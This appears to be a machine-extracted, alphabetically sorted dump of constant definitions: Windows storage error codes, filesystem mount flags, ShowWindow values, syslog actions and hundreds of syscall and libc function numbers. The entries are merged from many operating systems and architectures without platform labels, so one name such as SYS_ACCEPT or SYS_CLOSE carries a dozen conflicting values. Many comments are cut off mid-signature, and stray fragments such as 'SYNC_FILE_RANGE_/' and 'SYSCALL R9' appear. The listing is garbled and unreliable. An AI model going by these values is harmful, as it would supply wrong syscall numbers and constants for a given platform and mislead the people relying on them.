STG_E_PROPSETMISMATCHED                                                   Handle        = 0x800300F0
STG_E_READFAULT                                                           Handle        = 0x8003001E
STG_E_RESETS_EXHAUSTED                                                    Handle        = 0x8003030B
STG_E_REVERTED                                                            Handle        = 0x80030102
STG_E_SEEKERROR                                                           Handle        = 0x80030019
STG_E_SHAREREQUIRED                                                       Handle        = 0x80030106
STG_E_SHAREVIOLATION                                                      Handle        = 0x80030020
STG_E_STATUS_COPY_PROTECTION_FAILURE                                      Handle        = 0x80030305
STG_E_TERMINATED                                                          Handle        = 0x80030202
STG_E_TOOMANYOPENFILES                                                    Handle        = 0x80030004
STG_E_UNIMPLEMENTEDFUNCTION                                               Handle        = 0x800300FE
STG_E_UNKNOWN                                                             Handle        = 0x800300FD
STG_E_WRITEFAULT                                                          Handle        = 0x8003001D
STG_S_BLOCK                                                               Handle        = 0x00030201
STG_S_CANNOTCONSOLIDATE                                                   Handle        = 0x00030206
STG_S_CONSOLIDATIONFAILED                                                 Handle        = 0x00030205
STG_S_CONVERTED                                                           Handle        = 0x00030200
STG_S_MONITORING                                                          Handle        = 0x00030203
STG_S_MULTIPLEOPENS                                                       Handle        = 0x00030204
STG_S_POWER_CYCLE_REQUIRED                                                Handle        = 0x00030207
STG_S_RETRYNOW                                                            Handle        = 0x00030202
STORE_ERROR_LICENSE_REVOKED                                               syscall.Errno = 15864
STORE_ERROR_PENDING_COM_TRANSACTION                                       syscall.Errno = 15863
STORE_ERROR_UNLICENSED                                                    syscall.Errno = 15861
STORE_ERROR_UNLICENSED_USER                                               syscall.Errno = 15862
STRIP
ST_MANDLOCK    = 0x40
ST_NOATIME     = 0x400
ST_NODEV       = 0x4
ST_NODIRATIME  = 0x800
ST_NOEXEC      = 0x8
ST_NOSUID      = 0x2
ST_NOWAIT = 0x2
ST_RDONLY      = 0x1
ST_RELATIME    = 0x1000
ST_SYNCHRONOUS = 0x10
ST_WAIT   = 0x1
SUBLANG_ENGLISH_US = 0x01
SUB_CONTAINERS_AND_OBJECTS_INHERIT = 0x3
SUB_CONTAINERS_ONLY_INHERIT        = 0x2
SUB_OBJECTS_ONLY_INHERIT           = 0x1
SUOI_FORCEDELETE SUOI = 0x0001
SVE_MAGIC                        = 0x53564501
SW_FORCEMINIMIZE   = 11
SW_HIDE            = 0
SW_MAXIMIZE        = 3
SW_MINIMIZE        = 6
SW_NORMAL          = 1
SW_RESTORE         = 9
SW_SHOW            = 5
SW_SHOWDEFAULT     = 10
SW_SHOWMAXIMIZED   = 3
SW_SHOWMINIMIZED   = 2
SW_SHOWMINNOACTIVE = 7
SW_SHOWNA          = 8
SW_SHOWNOACTIVATE  = 4
SW_SHOWNORMAL      = 1
SYMBOLIC_LINK_FLAG_DIRECTORY     = 0x1
SYNCHRONIZE              = 0x00100000
SYNC_FILE_RANGE_/ 
SYNC_FILE_RANGE_WAIT_AFTER                  = 0x4
SYNC_FILE_RANGE_WAIT_BEFORE                 = 0x1
SYNC_FILE_RANGE_WRITE                       = 0x2
SYNC_FILE_RANGE_WRITE_AND_WAIT              = 0x7
SYSCALL
SYSCALL R9
SYSCTL_VERS/ 
SYSCTL_VERSION                    = 0x1000000
SYSCTL_VERS_0                     = 0x0
SYSCTL_VERS_1                     = 0x1000000
SYSCTL_VERS_MASK                  = 0xff000000
SYSFS_MAGIC                                 = 0x62656572
SYSLOG_ACTION_CLEAR         = 5
SYSLOG_ACTION_CLOSE         = 0
SYSLOG_ACTION_CONSOLE_LEVEL = 8
SYSLOG_ACTION_CONSOLE_OFF   = 6
SYSLOG_ACTION_CONSOLE_ON    = 7
SYSLOG_ACTION_OPEN          = 1
SYSLOG_ACTION_READ          = 2
SYSLOG_ACTION_READ_ALL      = 3
SYSLOG_ACTION_READ_CLEAR    = 4
SYSLOG_ACTION_SIZE_BUFFER   = 10
SYSLOG_ACTION_SIZE_UNREAD   = 9
SYS_A64L                            = 0x2EF
SYS_ABORT                           = 0x05C
SYS_ABORT2                   = 463 // { int abort2(const char 
SYS_ABORT_WITH_PAYLOAD             = 521
SYS_ABS                             = 0x090
SYS_ABSF                            = 0x631
SYS_ABSL                            = 0x632
SYS_ACCEPT                          = 0x336
SYS_ACCEPT                         = 30
SYS_ACCEPT                       = 285
SYS_ACCEPT                       = 330
SYS_ACCEPT                       = 4168
SYS_ACCEPT                  = 202
SYS_ACCEPT                  = 330
SYS_ACCEPT                  = 43
SYS_ACCEPT                  = 5042
SYS_ACCEPT                  = 99
SYS_ACCEPT               = 30  // { int
SYS_ACCEPT4                      = 344
SYS_ACCEPT4                      = 364
SYS_ACCEPT4                      = 366
SYS_ACCEPT4                      = 4334
SYS_ACCEPT4                 = 242
SYS_ACCEPT4                 = 288
SYS_ACCEPT4                 = 323
SYS_ACCEPT4                 = 344
SYS_ACCEPT4                 = 364
SYS_ACCEPT4                 = 5293
SYS_ACCEPT_AND_RECV                 = 0x4F7
SYS_ACCEPT_NOCANCEL                = 404
SYS_ACCESS                          = 0x175
SYS_ACCESS                         = 33
SYS_ACCESS                       = 33
SYS_ACCESS                       = 4033
SYS_ACCESS                   = 33  // { int access(char 
SYS_ACCESS                  = 21
SYS_ACCESS                  = 33
SYS_ACCESS                  = 5020
SYS_ACCESS                 = 33  // { int access(char 
SYS_ACCESS               = 33  // { int
SYS_ACCESS         = 33  // { int sys_access(const char 
SYS_ACCESS_EXTENDED                = 284
SYS_ACCT                           = 51
SYS_ACCT                         = 4051
SYS_ACCT                         = 51
SYS_ACCT                     = 51  // { int acct(char 
SYS_ACCT                    = 163
SYS_ACCT                    = 51
SYS_ACCT                    = 5158
SYS_ACCT                    = 89
SYS_ACCT                   = 51  // { int acct(char 
SYS_ACCT                 = 51  // { int
SYS_ACCT           = 51  // { int sys_acct(const char 
SYS_ACL_CREATE_ENTRY                = 0x803
SYS_ACL_DELETE_ENTRY                = 0x804
SYS_ACL_DELETE_FD                   = 0x806
SYS_ACL_DELETE_FILE                 = 0x807
SYS_ACL_FIRST_ENTRY                 = 0x800
SYS_ACL_FREE                        = 0x7FF
SYS_ACL_FROM_TEXT                   = 0x80C
SYS_ACL_GET_ENTRY                   = 0x801
SYS_ACL_GET_FD                      = 0x808
SYS_ACL_GET_FILE                    = 0x809
SYS_ACL_INIT                        = 0x7FE
SYS_ACL_SET_FD                      = 0x80A
SYS_ACL_SET_FILE                    = 0x80B
SYS_ACL_SORT                        = 0x80E
SYS_ACL_TO_TEXT                     = 0x80D
SYS_ACL_UPDATE_ENTRY                = 0x805
SYS_ACL_VALID                       = 0x802
SYS_ACOS                            = 0x043
SYS_ACOSD128                        = 0xB80
SYS_ACOSD32                         = 0xB7E
SYS_ACOSD64                         = 0xB7F
SYS_ACOSF                           = 0x633
SYS_ACOSH                           = 0x320
SYS_ACOSHD128                       = 0xB83
SYS_ACOSHD32                        = 0xB81
SYS_ACOSHD64                        = 0xB82
SYS_ACOSHF                          = 0x86E
SYS_ACOSHL                          = 0x86F
SYS_ACOSL                           = 0x634
SYS_ADD_KEY                      = 269
SYS_ADD_KEY                      = 286
SYS_ADD_KEY                      = 309
SYS_ADD_KEY                      = 4280
SYS_ADD_KEY                 = 217
SYS_ADD_KEY                 = 248
SYS_ADD_KEY                 = 269
SYS_ADD_KEY                 = 278
SYS_ADD_KEY                 = 281
SYS_ADD_KEY                 = 5239
SYS_ADJFREQ        = 305 // { int sys_adjfreq(const int64_t 
SYS_ADJTIME                        = 140
SYS_ADJTIME                  = 140 // { int adjtime(struct timeval 
SYS_ADJTIME                = 140 // { int adjtime(struct timeval 
SYS_ADJTIME              = 421 // { int
SYS_ADJTIME        = 140 // { int sys_adjtime(const struct timeval 
SYS_ADJTIMEX                     = 124
SYS_ADJTIMEX                     = 4124
SYS_ADJTIMEX                = 124
SYS_ADJTIMEX                = 159
SYS_ADJTIMEX                = 171
SYS_ADJTIMEX                = 219
SYS_ADJTIMEX                = 5154
SYS_AFS_SYSCALL                  = 137
SYS_AFS_SYSCALL                  = 4137
SYS_AFS_SYSCALL             = 137
SYS_AFS_SYSCALL             = 183
SYS_AFS_SYSCALL             = 227
SYS_AFS_SYSCALL             = 5176
SYS_AIO_CANCEL                      = 0x504
SYS_AIO_CANCEL                     = 316
SYS_AIO_ERROR                       = 0x505
SYS_AIO_ERROR                      = 317
SYS_AIO_ERROR                = 317 // { int aio_error(struct aiocb 
SYS_AIO_ERROR              = 317 // { int aio_error(struct aiocb 
SYS_AIO_FSYNC                       = 0xC69
SYS_AIO_FSYNC                      = 313
SYS_AIO_MLOCK                = 543 // { int aio_mlock(struct aiocb 
SYS_AIO_READ                        = 0x506
SYS_AIO_READ                       = 318
SYS_AIO_READ                 = 255 // { int aio_read(struct aiocb 
SYS_AIO_READ               = 318 // { int aio_read(struct aiocb 
SYS_AIO_RETURN                      = 0x507
SYS_AIO_RETURN                     = 314
SYS_AIO_RETURN               = 314 // { ssize_t aio_return(struct aiocb 
SYS_AIO_RETURN             = 314 // { int aio_return(struct aiocb 
SYS_AIO_SUSPEND                     = 0x508
SYS_AIO_SUSPEND                    = 315
SYS_AIO_SUSPEND              = 315 // { int aio_suspend( struct aiocb 
SYS_AIO_SUSPEND            = 315 // { int aio_suspend(struct aiocb 
SYS_AIO_SUSPEND_NOCANCEL           = 421
SYS_AIO_WAITCOMPLETE         = 359 // { ssize_t aio_waitcomplete( struct aiocb 
SYS_AIO_WAITCOMPLETE       = 359 // { int aio_waitcomplete(struct aiocb 
SYS_AIO_WRITE                       = 0x509
SYS_AIO_WRITE                      = 319
SYS_AIO_WRITE                = 256 // { int aio_write(struct aiocb 
SYS_AIO_WRITE              = 319 // { int aio_write(struct aiocb 
SYS_ALARM                           = 0x176
SYS_ALARM                        = 27
SYS_ALARM                        = 4027
SYS_ALARM                   = 27
SYS_ALARM                   = 37
SYS_ALARM                   = 5037
SYS_ALARM       = 6
SYS_ARCH_PRCTL                   = 384
SYS_ARCH_PRCTL              = 158
SYS_ARCH_SPECIFIC_SYSCALL   = 244
SYS_ARM_FADVISE64_64             = 270
SYS_ARM_SYNC_FILE_RANGE          = 341
SYS_ASCTIME                         = 0x0AE
SYS_ASCTIME64                       = 0xCD7
SYS_ASCTIME64_R                     = 0xCD8
SYS_ASCTIME_R                       = 0x5E0
SYS_ASIN                            = 0x03E
SYS_ASIND128                        = 0xB86
SYS_ASIND32                         = 0xB84
SYS_ASIND64                         = 0xB85
SYS_ASINF                           = 0x635
SYS_ASINH                           = 0x321
SYS_ASINHD128                       = 0xB89
SYS_ASINHD32                        = 0xB87
SYS_ASINHD64                        = 0xB88
SYS_ASINHF                          = 0x870
SYS_ASINHL                          = 0x871
SYS_ASINL                           = 0x636
SYS_ATAN                            = 0x044
SYS_ATAN2                           = 0x045
SYS_ATAN2D128                       = 0xB8F
SYS_ATAN2D32                        = 0xB8D
SYS_ATAN2D64                        = 0xB8E
SYS_ATAN2F                          = 0x637
SYS_ATAN2L                          = 0x638
SYS_ATAND128                        = 0xB8C
SYS_ATAND32                         = 0xB8A
SYS_ATAND64                         = 0xB8B
SYS_ATANF                           = 0x639
SYS_ATANH                           = 0x322
SYS_ATANHD128                       = 0xB92
SYS_ATANHD32                        = 0xB90
SYS_ATANHD64                        = 0xB91
SYS_ATANHF                          = 0x872
SYS_ATANHL                          = 0x873
SYS_ATANL                           = 0x63A
SYS_ATEXIT                          = 0x05D
SYS_ATOF                            = 0x050
SYS_ATOI                            = 0x051
SYS_ATOL                            = 0x04E
SYS_ATOLL                           = 0x956
SYS_AUDIT                          = 350
SYS_AUDIT                    = 445 // { int audit(const void 
SYS_AUDITCTL                       = 359
SYS_AUDITCTL                 = 453 // { int auditctl(char 
SYS_AUDITON                        = 351
SYS_AUDIT_SESSION_JOIN             = 429
SYS_AUDIT_SESSION_PORT             = 432
SYS_AUDIT_SESSION_SELF             = 428
SYS_AWAIT       = 47
SYS_BASENAME                        = 0x302
SYS_BCMP                            = 0x2B9
SYS_BCOPY                           = 0x2BA
SYS_BDFLUSH                      = 134
SYS_BDFLUSH                      = 4134
SYS_BDFLUSH                 = 134
SYS_BDFLUSH                 = 225
SYS_BIND                            = 0x337
SYS_BIND                           = 104
SYS_BIND                         = 282
SYS_BIND                         = 327
SYS_BIND                         = 361
SYS_BIND                         = 4169
SYS_BIND                    = 200
SYS_BIND                    = 327
SYS_BIND                    = 353
SYS_BIND                    = 361
SYS_BIND                    = 49
SYS_BIND                    = 5048
SYS_BIND                 = 104 // { int
SYS_BIND        = 2
SYS_BIND2ADDRSEL                    = 0xD59
SYS_BPF                          = 357
SYS_BPF                          = 361
SYS_BPF                          = 386
SYS_BPF                          = 4355
SYS_BPF                     = 280
SYS_BPF                     = 321
SYS_BPF                     = 349
SYS_BPF                     = 351
SYS_BPF                     = 361
SYS_BPF                     = 5315
SYS_BREAK                        = 17
SYS_BREAK                        = 4017
SYS_BREAK                   = 17
SYS_BREAK                = 17  // { int
SYS_BRK                          = 4045
SYS_BRK                          = 45
SYS_BRK                     = 12
SYS_BRK                     = 17
SYS_BRK                     = 214
SYS_BRK                     = 45
SYS_BRK                     = 5012
SYS_BRK_        = 24
SYS_BSDTHREAD_CREATE               = 360
SYS_BSDTHREAD_CTL                  = 478
SYS_BSDTHREAD_REGISTER             = 366
SYS_BSDTHREAD_TERMINATE            = 361
SYS_BSD_SIGNAL                      = 0x288
SYS_BSEARCH                         = 0x24C
SYS_BTOWC                           = 0x65F
SYS_BZERO                           = 0x2BB
SYS_C16RTOMB                        = 0xD40
SYS_C32RTOMB                        = 0xD41
SYS_CABS                            = 0x98E
SYS_CABSF                           = 0x991
SYS_CABSL                           = 0x994
SYS_CACHECTL                     = 4148
SYS_CACHECTL                = 5198
SYS_CACHEFLUSH                   = 4147
SYS_CACHEFLUSH              = 5197
SYS_CACOS                           = 0x997
SYS_CACOSF                          = 0x99A
SYS_CACOSH                          = 0x9A0
SYS_CACOSHF                         = 0x9A3
SYS_CACOSHL                         = 0x9A6
SYS_CACOSL                          = 0x99D
SYS_CALLOC                          = 0x058
SYS_CAPGET                       = 183
SYS_CAPGET                       = 184
SYS_CAPGET                       = 4204
SYS_CAPGET                  = 125
SYS_CAPGET                  = 183
SYS_CAPGET                  = 184
SYS_CAPGET                  = 21
SYS_CAPGET                  = 5123
SYS_CAPGET                  = 90
SYS_CAPSET                       = 184
SYS_CAPSET                       = 185
SYS_CAPSET                       = 4205
SYS_CAPSET                  = 126
SYS_CAPSET                  = 184
SYS_CAPSET                  = 185
SYS_CAPSET                  = 22
SYS_CAPSET                  = 5124
SYS_CAPSET                  = 91
SYS_CAP_ENTER                = 516 // { int cap_enter(void)
SYS_CAP_GETMODE              = 517 // { int cap_getmode(u_int 
SYS_CARG                            = 0x9A9
SYS_CARGF                           = 0x9AC
SYS_CARGL                           = 0x9AF
SYS_CASIN                           = 0x9B2
SYS_CASINF                          = 0x9B5
SYS_CASINH                          = 0x9BB
SYS_CASINHF                         = 0x9BE
SYS_CASINHL                         = 0x9C1
SYS_CASINL                          = 0x9B8
SYS_CATAN                           = 0x9C4
SYS_CATANF                          = 0x9C7
SYS_CATANH                          = 0x9CD
SYS_CATANHF                         = 0x9D0
SYS_CATANHL                         = 0x9D3
SYS_CATANL                          = 0x9CA
SYS_CATCLOSE                        = 0x2B6
SYS_CATGETS                         = 0x2B7
SYS_CATOPEN                         = 0x2B8
SYS_CBRT                            = 0x323
SYS_CBRTD128                        = 0xB95
SYS_CBRTD32                         = 0xB93
SYS_CBRTD64                         = 0xB94
SYS_CBRTF                           = 0x874
SYS_CBRTL                           = 0x875
SYS_CCLASS                          = 0x151
SYS_CCOS                            = 0x9D6
SYS_CCOSF                           = 0x9D9
SYS_CCOSH                           = 0x9DF
SYS_CCOSHF                          = 0x9E2
SYS_CCOSHL                          = 0x9E5
SYS_CCOSL                           = 0x9DC
SYS_CEIL                            = 0x01F
SYS_CEILD128                        = 0xB98
SYS_CEILD32                         = 0xB96
SYS_CEILD64                         = 0xB97
SYS_CEILF                           = 0x63B
SYS_CEILL                           = 0x63C
SYS_CEXP                            = 0x9E8
SYS_CEXPF                           = 0x9EB
SYS_CEXPL                           = 0x9EE
SYS_CFGETISPEED                     = 0x177
SYS_CFGETOSPEED                     = 0x178
SYS_CFSETISPEED                     = 0x179
SYS_CFSETOSPEED                     = 0x17A
SYS_CHANGE_FDGUARD_NP              = 444
SYS_CHAUDIT                         = 0x1E0
SYS_CHDIR                           = 0x17B
SYS_CHDIR                          = 12
SYS_CHDIR                        = 12
SYS_CHDIR                        = 4012
SYS_CHDIR                    = 12  // { int chdir(char 
SYS_CHDIR                   = 12
SYS_CHDIR                   = 49
SYS_CHDIR                   = 5078
SYS_CHDIR                   = 80
SYS_CHDIR                  = 12  // { int chdir(char 
SYS_CHDIR                = 12  // { int
SYS_CHDIR          = 12  // { int sys_chdir(const char 
SYS_CHDIR       = 3
SYS_CHECKSCH                        = 0x4BC
SYS_CHECKSCHENV                     = 0x4BC
SYS_CHFLAGS                        = 34
SYS_CHFLAGS                  = 34  // { int chflags(const char 
SYS_CHFLAGS                = 34  // { int chflags(const char 
SYS_CHFLAGS              = 34  // { int
SYS_CHFLAGS        = 34  // { int sys_chflags(const char 
SYS_CHMOD                           = 0x17C
SYS_CHMOD                          = 15
SYS_CHMOD                        = 15
SYS_CHMOD                        = 4015
SYS_CHMOD                    = 15  // { int chmod(char 
SYS_CHMOD                   = 15
SYS_CHMOD                   = 5088
SYS_CHMOD                   = 90
SYS_CHMOD                  = 15  // { int chmod(char 
SYS_CHMOD                = 15  // { int
SYS_CHMOD          = 15  // { int sys_chmod(const char 
SYS_CHMOD_EXTENDED                 = 282
SYS_CHOWN                           = 0x17D
SYS_CHOWN                          = 16
SYS_CHOWN                        = 181
SYS_CHOWN                        = 182
SYS_CHOWN                        = 4202
SYS_CHOWN                    = 16  // { int chown(char 
SYS_CHOWN                   = 13
SYS_CHOWN                   = 181
SYS_CHOWN                   = 212
SYS_CHOWN                   = 5090
SYS_CHOWN                   = 92
SYS_CHOWN                  = 16  // { int chown(char 
SYS_CHOWN                = 16  // { int
SYS_CHOWN          = 16  // { int sys_chown(const char 
SYS_CHOWN32                      = 212
SYS_CHPRIORITY                      = 0x384
SYS_CHROOT                          = 0x36A
SYS_CHROOT                         = 61
SYS_CHROOT                       = 4061
SYS_CHROOT                       = 61
SYS_CHROOT                   = 61  // { int chroot(char 
SYS_CHROOT                  = 161
SYS_CHROOT                  = 51
SYS_CHROOT                  = 5156
SYS_CHROOT                  = 61
SYS_CHROOT                 = 61  // { int chroot(char 
SYS_CHROOT               = 61  // { int
SYS_CHROOT         = 61  // { int sys_chroot(const char 
SYS_CHROOT_KERNEL          = 522 // { int chroot_kernel(char 
SYS_CIMAG                           = 0x9F1
SYS_CIMAGF                          = 0x9F4
SYS_CIMAGL                          = 0x9F7
SYS_CLEARENV                        = 0x0C9
SYS_CLEARERR                        = 0x04C
SYS_CLEARERR_UNLOCKED               = 0xCA1
SYS_CLOCK                           = 0x0AA
SYS_CLOCK_ADJTIME                = 343
SYS_CLOCK_ADJTIME                = 347
SYS_CLOCK_ADJTIME                = 372
SYS_CLOCK_ADJTIME                = 4341
SYS_CLOCK_ADJTIME           = 266
SYS_CLOCK_ADJTIME           = 305
SYS_CLOCK_ADJTIME           = 334
SYS_CLOCK_ADJTIME           = 337
SYS_CLOCK_ADJTIME           = 347
SYS_CLOCK_ADJTIME           = 5300
SYS_CLOCK_ADJTIME64              = 405
SYS_CLOCK_ADJTIME64              = 4405
SYS_CLOCK_GETRES                 = 247
SYS_CLOCK_GETRES                 = 264
SYS_CLOCK_GETRES                 = 266
SYS_CLOCK_GETRES                 = 4264
SYS_CLOCK_GETRES            = 114
SYS_CLOCK_GETRES            = 229
SYS_CLOCK_GETRES            = 247
SYS_CLOCK_GETRES            = 258
SYS_CLOCK_GETRES            = 261
SYS_CLOCK_GETRES            = 5223
SYS_CLOCK_GETRES         = 429 // { int
SYS_CLOCK_GETRES_TIME64          = 406
SYS_CLOCK_GETRES_TIME64          = 4406
SYS_CLOCK_GETTIME                = 246
SYS_CLOCK_GETTIME                = 263
SYS_CLOCK_GETTIME                = 265
SYS_CLOCK_GETTIME                = 4263
SYS_CLOCK_GETTIME           = 113
SYS_CLOCK_GETTIME           = 228
SYS_CLOCK_GETTIME           = 246
SYS_CLOCK_GETTIME           = 257
SYS_CLOCK_GETTIME           = 260
SYS_CLOCK_GETTIME           = 5222
SYS_CLOCK_GETTIME        = 427 // { int
SYS_CLOCK_GETTIME64              = 403
SYS_CLOCK_GETTIME64              = 4403
SYS_CLOCK_NANOSLEEP              = 248
SYS_CLOCK_NANOSLEEP              = 265
SYS_CLOCK_NANOSLEEP              = 267
SYS_CLOCK_NANOSLEEP              = 4265
SYS_CLOCK_NANOSLEEP         = 115
SYS_CLOCK_NANOSLEEP         = 230
SYS_CLOCK_NANOSLEEP         = 248
SYS_CLOCK_NANOSLEEP         = 259
SYS_CLOCK_NANOSLEEP         = 262
SYS_CLOCK_NANOSLEEP         = 5224
SYS_CLOCK_NANOSLEEP_TIME64       = 407
SYS_CLOCK_NANOSLEEP_TIME64       = 4407
SYS_CLOCK_SETTIME                = 245
SYS_CLOCK_SETTIME                = 262
SYS_CLOCK_SETTIME                = 264
SYS_CLOCK_SETTIME                = 4262
SYS_CLOCK_SETTIME           = 112
SYS_CLOCK_SETTIME           = 227
SYS_CLOCK_SETTIME           = 245
SYS_CLOCK_SETTIME           = 256
SYS_CLOCK_SETTIME           = 259
SYS_CLOCK_SETTIME           = 5221
SYS_CLOCK_SETTIME        = 428 // { int
SYS_CLOCK_SETTIME64              = 404
SYS_CLOCK_SETTIME64              = 4404
SYS_CLOGF                           = 0x9FD
SYS_CLOGL                           = 0xA00
SYS_CLONE                        = 120
SYS_CLONE                        = 4120
SYS_CLONE                   = 120
SYS_CLONE                   = 217
SYS_CLONE                   = 220
SYS_CLONE                   = 5055
SYS_CLONE                   = 56
SYS_CLONE3                       = 435
SYS_CLONE3                       = 4435
SYS_CLONE3                  = 435
SYS_CLONE3                  = 5435
SYS_CLONEFILEAT                    = 462
SYS_CLOSE                           = 0x17E
SYS_CLOSE                          = 6
SYS_CLOSE                        = 4006
SYS_CLOSE                        = 6
SYS_CLOSE                    = 6   // { int close(int fd)
SYS_CLOSE                   = 3
SYS_CLOSE                   = 5003
SYS_CLOSE                   = 57
SYS_CLOSE                   = 6
SYS_CLOSE                = 6   // { int
SYS_CLOSE          = 6   // { int sys_close(int fd)
SYS_CLOSE       = 4
SYS_CLOSE = 6 // { int close(int fd)
SYS_CLOSEDIR                        = 0x17F
SYS_CLOSEFROM                = 509 // { int closefrom(int lowfd)
SYS_CLOSEFROM              = 474 // { int closefrom(int fd)
SYS_CLOSEFROM      = 287 // { int sys_closefrom(int fd)
SYS_CLOSELOG                        = 0x371
SYS_CLOSE_NOCANCEL                 = 399
SYS_CLOSE_RANGE                  = 436
SYS_CLOSE_RANGE                  = 4436
SYS_CLOSE_RANGE             = 436
SYS_CLOSE_RANGE             = 5436
SYS_CLRMEMF                         = 0x0BD
SYS_COALITION                      = 458
SYS_COALITION_INFO                 = 459
SYS_COLLEQUIV                       = 0x14F
SYS_COLLORDER                       = 0x152
SYS_COLLRANGE                       = 0x150
SYS_COLLTOSTR                       = 0x14E
SYS_CONFSTR                         = 0x299
SYS_CONJ                            = 0xA03
SYS_CONJF                           = 0xA06
SYS_CONJL                           = 0xA09
SYS_CONNECT                         = 0x338
SYS_CONNECT                        = 98
SYS_CONNECT                      = 283
SYS_CONNECT                      = 328
SYS_CONNECT                      = 362
SYS_CONNECT                      = 4170
SYS_CONNECT                 = 203
SYS_CONNECT                 = 328
SYS_CONNECT                 = 362
SYS_CONNECT                 = 42
SYS_CONNECT                 = 5041
SYS_CONNECT                 = 98
SYS_CONNECT              = 98  // { int
SYS_CONNECTE                        = 0x5AE
SYS_CONNECTEXPORTIMPORT             = 0x5AE
SYS_CONNECTS                        = 0x4B5
SYS_CONNECTSERVER                   = 0x4B5
SYS_CONNECTW                        = 0x4B4
SYS_CONNECTWORKMGR                  = 0x4B4
SYS_CONNECTX                       = 447
SYS_CONNECT_NOCANCEL               = 409
SYS_CONTINUE                        = 0x4B3
SYS_CONTINUEWORKUNIT                = 0x4B3
SYS_COPYFILE                       = 227
SYS_COPYSIGN                        = 0x4C2
SYS_COPYSIGND128                    = 0xB9E
SYS_COPYSIGND32                     = 0xB9C
SYS_COPYSIGND64                     = 0xB9D
SYS_COPYSIGNF                       = 0x876
SYS_COPYSIGNL                       = 0x877
SYS_COPY_FILE_RANGE              = 377
SYS_COPY_FILE_RANGE              = 379
SYS_COPY_FILE_RANGE              = 391
SYS_COPY_FILE_RANGE              = 4360
SYS_COPY_FILE_RANGE         = 285
SYS_COPY_FILE_RANGE         = 326
SYS_COPY_FILE_RANGE         = 357
SYS_COPY_FILE_RANGE         = 375
SYS_COPY_FILE_RANGE         = 379
SYS_COPY_FILE_RANGE         = 5320
SYS_COS                             = 0x040
SYS_COSD128                         = 0xBA1
SYS_COSD32                          = 0xB9F
SYS_COSD64                          = 0xBA0
SYS_COSF                            = 0x63D
SYS_COSH                            = 0x018
SYS_COSHD128                        = 0xBA4
SYS_COSHD32                         = 0xBA2
SYS_COSHD64                         = 0xBA3
SYS_COSHF                           = 0x63F
SYS_COSHL                           = 0x640
SYS_COSL                            = 0x63E
SYS_COTAN                           = 0x879
SYS_COTANF                          = 0x878
SYS_COTANL                          = 0x87A
SYS_CPOW                            = 0xA0C
SYS_CPOWF                           = 0xA0F
SYS_CPOWL                           = 0xA12
SYS_CPROJ                           = 0xA15
SYS_CPROJF                          = 0xA18
SYS_CPROJL                          = 0xA1B
SYS_CPUSET                   = 484 // { int cpuset(cpusetid_t 
SYS_CPYSIGNF                        = 0x876
SYS_CPYSIGNL                        = 0x877
SYS_CREAL                           = 0xA1E
SYS_CREALF                          = 0xA21
SYS_CREALL                          = 0xA24
SYS_CREAT                           = 0x180
SYS_CREAT                        = 4008
SYS_CREAT                        = 8
SYS_CREAT                   = 5083
SYS_CREAT                   = 8
SYS_CREAT                   = 85
SYS_CREATE      = 22
SYS_CREATEWO                        = 0x4B2
SYS_CREATEWORKUNIT                  = 0x4B2
SYS_CREATE_MODULE                = 127
SYS_CREATE_MODULE                = 4127
SYS_CREATE_MODULE           = 127
SYS_CREATE_MODULE           = 174
SYS_CREATE_MODULE           = 221
SYS_CREATE_MODULE           = 5167
SYS_CRYPT                           = 0x2AC
SYS_CSIN                            = 0xA27
SYS_CSINF                           = 0xA2A
SYS_CSINH                           = 0xA30
SYS_CSINHF                          = 0xA33
SYS_CSINHL                          = 0xA36
SYS_CSINL                           = 0xA2D
SYS_CSNAP                           = 0x0C5
SYS_CSOPS                          = 169
SYS_CSOPS_AUDITTOKEN               = 170
SYS_CSQRT                           = 0xA39
SYS_CSQRTF                          = 0xA3C
SYS_CSQRTL                          = 0xA3F
SYS_CSRCTL                         = 483
SYS_CTAN                            = 0xA42
SYS_CTANF                           = 0xA45
SYS_CTANH                           = 0xA4B
SYS_CTANHF                          = 0xA4E
SYS_CTANHL                          = 0xA51
SYS_CTANL                           = 0xA48
SYS_CTERMID                         = 0x181
SYS_CTIME                           = 0x0AB
SYS_CTIME64                         = 0xCD9
SYS_CTIME64_R                       = 0xCDA
SYS_CTIME_R                         = 0x5E1
SYS_CTRACE                          = 0x0C6
SYS_CUSERID                         = 0x315
SYS_DBM_CLEARERR                    = 0x2F7
SYS_DBM_CLOSE                       = 0x2F8
SYS_DBM_DELETE                      = 0x2F9
SYS_DBM_ERROR                       = 0x2FA
SYS_DBM_FETCH                       = 0x2FB
SYS_DBM_FIRSTKEY                    = 0x2FC
SYS_DBM_NEXTKEY                     = 0x2FD
SYS_DBM_OPEN                        = 0x2FE
SYS_DBM_STORE                       = 0x2FF
SYS_DELETE                         = 226
SYS_DELETEWO                        = 0x4B9
SYS_DELETEWORKUNIT                  = 0x4B9
SYS_DELETE_MODULE                = 129
SYS_DELETE_MODULE                = 4129
SYS_DELETE_MODULE           = 106
SYS_DELETE_MODULE           = 129
SYS_DELETE_MODULE           = 176
SYS_DELETE_MODULE           = 222
SYS_DELETE_MODULE           = 5169
SYS_DIFFTIME                        = 0x0A7
SYS_DIFFTIME64                      = 0xCDB
SYS_DIRNAME                         = 0x303
SYS_DISCONNE                        = 0x4B6
SYS_DISCONNECTSERVER                = 0x4B6
SYS_DISCONNECTX                    = 448
SYS_DIV                             = 0x091
SYS_DLADDR                          = 0xC82
SYS_DLCLOSE                         = 0x8DF
SYS_DLERROR                         = 0x8E0
SYS_DLLFREE                         = 0x16F
SYS_DLLLOAD                         = 0x170
SYS_DLLQUERYFN                      = 0x16D
SYS_DLLQUERYVAR                     = 0x16E
SYS_DLOPEN                          = 0x8DD
SYS_DLSYM                           = 0x8DE
SYS_DN_COMP                         = 0x5DF
SYS_DN_EXPAND                       = 0x5DD
SYS_DN_FIND                         = 0x668
SYS_DN_SKIPNAME                     = 0x5DE
SYS_DRAND48                         = 0x2B2
SYS_DUP                             = 0x182
SYS_DUP                            = 41
SYS_DUP                          = 4041
SYS_DUP                          = 41
SYS_DUP                      = 41  // { int dup(u_int fd)
SYS_DUP                     = 23
SYS_DUP                     = 32
SYS_DUP                     = 41
SYS_DUP                     = 5031
SYS_DUP                    = 41  // { int dup(int fd)
SYS_DUP                  = 41  // { int
SYS_DUP            = 41  // { int sys_dup(int fd)
SYS_DUP         = 5
SYS_DUP2                            = 0x183
SYS_DUP2                           = 90
SYS_DUP2                         = 4063
SYS_DUP2                         = 63
SYS_DUP2                    = 33
SYS_DUP2                    = 5032
SYS_DUP2                    = 63
SYS_DUP2                    = 90
SYS_DUP2                 = 90  // { int
SYS_DUP3                         = 316
